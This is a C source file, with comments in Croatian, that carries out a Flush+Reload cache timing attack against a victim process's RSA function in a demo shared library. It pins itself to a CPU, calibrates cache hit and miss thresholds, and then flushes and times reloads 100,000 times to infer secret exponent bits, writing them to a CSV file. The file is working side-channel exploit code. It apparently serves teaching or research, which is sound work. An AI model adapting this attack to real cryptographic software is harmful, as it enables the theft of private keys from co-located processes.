/* attacker_fr.c — Flush+Reload napad na victim_fr proces */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sched.h>
#include <inttypes.h>
#include <dlfcn.h>
#include "timing.h"
#include "rsa.h"

extern uint64_t rsa_multiply_step(uint64_t, uint64_t, uint64_t);
extern uint64_t rsa_decrypt_shared(uint64_t, uint64_t, uint64_t);

#define NUM_OBSERVATIONS    100000
#define FLUSH_WAIT_NS       5000
#define CALIBRATION_ROUNDS  200
#define OUTPUT_FILE         "flush_reload.csv"

static inline void clflush_addr(volatile void *addr) {
    __asm__ volatile("clflush (%0)" : : "r"(addr) : "memory");
}

static inline uint64_t reload_latency(volatile void *addr) {
    uint32_t cpu_id;
    COMPILER_BARRIER();
    uint64_t t_start = tsc_start();
    COMPILER_BARRIER();
    volatile uint64_t dummy = *(volatile uint64_t *)addr;
    (void)dummy;
    COMPILER_BARRIER();
    uint64_t t_end = tsc_end_with_cpu(&cpu_id);
    COMPILER_BARRIER();
    if (cpu_id != 0) return UINT64_MAX;
    return t_end - t_start;
}

/* buffer za kalibraciju DRAM latencije — nikad ga ne dodiruju ni victim ni attacker */
static volatile char calib_dummy[128] __attribute__((aligned(64)));

static uint64_t calibrate_threshold(void *addr) {
    uint64_t hit_total = 0, miss_total = 0;
    int hit_n = 0, miss_n = 0;
    void *dummy_addr = (void *)calib_dummy;

    /* kalibracija L1 hit latencije: flush → self-load → reload */
    for (int i = 0; i < CALIBRATION_ROUNDS; i++) {
        clflush_addr(addr);
        __asm__ volatile("mfence" ::: "memory");
        volatile uint8_t tmp = *(volatile uint8_t *)addr;
        (void)tmp;
        uint64_t lat = reload_latency(addr);
        if (lat < 10000) { hit_total += lat; hit_n++; }
    }

    /* kalibracija DRAM miss latencije: flush dummy → odmah reload */
    for (int i = 0; i < CALIBRATION_ROUNDS; i++) {
        clflush_addr(dummy_addr);
        __asm__ volatile("mfence" ::: "memory");
        uint64_t lat = reload_latency(dummy_addr);
        if (lat > 50 && lat < 1000000) { miss_total += lat; miss_n++; }
    }

    double hit_avg  = (hit_n  > 0) ? (double)hit_total  / hit_n  : 80.0;
    double miss_avg = (miss_n > 0) ? (double)miss_total / miss_n : 500.0;
    uint64_t threshold = (uint64_t)((hit_avg + miss_avg) / 2.0);

    printf("[CAL] Cache hit  avg (self-load, L1):  %6.1f cycles (n=%d)\n", hit_avg, hit_n);
    printf("[CAL] Cache miss avg (DRAM, dummy):    %6.1f cycles (n=%d)\n", miss_avg, miss_n);
    printf("[CAL] Separacija:                      %6.1f cycles\n", miss_avg - hit_avg);
    printf("[CAL] Dinamicki threshold:             %llu cycles\n", (unsigned long long)threshold);

    return threshold;
}

int main(void) {
    printf("================================================================\n");
    printf("  Flush+Reload Attack Demo\n");
    printf("  Target: rsa_multiply_step() in librsa_shared.so\n");
    printf("  Observations: %d\n", NUM_OBSERVATIONS);
    printf("================================================================\n\n");

    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(0, &cs);
    if (sched_setaffinity(0, sizeof(cs), &cs) == 0)
        printf("[OK] Attacker pinned to CPU 0\n");

    /* dlsym daje pravu adresu u .so, a ne PLT stub u ovom binarnom */
    void *lib_handle = dlopen("./librsa_shared.so", RTLD_LAZY | RTLD_NOLOAD);
    if (!lib_handle) lib_handle = dlopen("./librsa_shared.so", RTLD_LAZY);
    if (!lib_handle) {
        fprintf(stderr, "[ERR] dlopen: %s\n", dlerror());
        return 1;
    }
    void *target_addr = dlsym(lib_handle, "rsa_multiply_step");
    if (!target_addr) {
        fprintf(stderr, "[ERR] dlsym: %s\n", dlerror());
        return 1;
    }

    void *plt_addr = (void *)rsa_multiply_step;
    printf("[OK] PLT stub adresa (&rsa_multiply_step): %p\n", plt_addr);
    printf("[OK] Prava adresa    (dlsym):               %p\n", target_addr);
    if (plt_addr != target_addr)
        printf("[OK] Adrese se razlikuju — PLT bug sprijecen pomocu dlsym\n");

    printf("\n--- Kalibracija cache hit/miss praga ---\n");
    uint64_t cache_threshold = calibrate_threshold(target_addr);
    if (cache_threshold < 50)   cache_threshold = 50;
    if (cache_threshold > 2000) cache_threshold = 2000;
    printf("[OK] Koristim threshold: %llu cycles\n\n", (unsigned long long)cache_threshold);

    printf("[INFO] Starting observations (victim should be running on CPU 2)...\n\n");

    FILE *fp = fopen(OUTPUT_FILE, "w");
    if (!fp) { perror("fopen"); return 1; }
    fprintf(fp, "observation,reload_latency,cache_hit,inferred_bit\n");

    int hit_count = 0, miss_count = 0;

    printf("  Obs    Latency  Hit?  \n");
    printf("  -------------------------\n");

    for (int obs = 0; obs < NUM_OBSERVATIONS; obs++) {
        /* korak 1: eviktiraj cache liniju rsa_multiply_step */
        clflush_addr(target_addr);
        __asm__ volatile("mfence" ::: "memory");

        /* korak 2: čekaj da victim izvrši dekriptaciju */
        struct timespec wait = {0, FLUSH_WAIT_NS};
        nanosleep(&wait, NULL);

        /* korak 3: mjeri latenciju ponovnog učitavanja */
        uint64_t lat = reload_latency(target_addr);

        int cache_hit    = (lat < cache_threshold) ? 1 : 0;
        int inferred_bit = cache_hit;

        if (cache_hit) hit_count++;
        else           miss_count++;

        fprintf(fp, "%d,%" PRIu64 ",%d,%d\n", obs, lat, cache_hit, inferred_bit);

        if (obs < 20 || obs % 5000 == 0) {
            printf("  %5d  %7" PRIu64 "   %s\n",
                   obs, lat,
                   cache_hit ? "HIT " : "MISS");
        }
    }

    fclose(fp);

    printf("\n================================================================\n");
    printf("  REZULTATI Flush+Reload\n");
    printf("================================================================\n");
    printf("  Target:    rsa_multiply_step() [conditional multiply]\n");
    printf("  Victim:    CPU 2\n");
    printf("  Threshold: %llu cycles\n", (unsigned long long)cache_threshold);
    printf("  Cache hits:   %d / %d  (%.1f%%)\n",
           hit_count, NUM_OBSERVATIONS,
           100.0 * hit_count / NUM_OBSERVATIONS);
    printf("  Cache misses: %d / %d  (%.1f%%)\n",
           miss_count, NUM_OBSERVATIONS,
           100.0 * miss_count / NUM_OBSERVATIONS);
    printf("\n  Izlazni fajl: %s\n", OUTPUT_FILE);
    printf("  Pokreni: python3 flush_reload_analysis.py\n");
    printf("================================================================\n");

    return 0;
}
